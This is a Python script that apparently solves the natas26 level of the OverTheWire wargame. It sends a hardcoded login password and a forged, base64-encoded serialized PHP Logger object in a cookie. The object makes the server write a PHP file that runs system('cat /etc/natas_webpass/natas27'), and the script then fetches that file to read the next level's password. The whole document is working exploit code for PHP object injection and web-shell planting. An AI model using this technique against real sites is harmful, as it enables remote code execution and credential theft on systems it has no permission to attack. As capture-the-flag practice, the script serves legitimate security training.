#!/usr/bin/env python3
import requests

url = 'http://natas26.natas.labs.overthewire.org/'
s = requests.Session()
s.auth = ("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T")
r = s.get(url)
s.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2hlbGxvLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='
r = s.get(url)
r = s.get(url+'img/hello.php')
print(r.text)
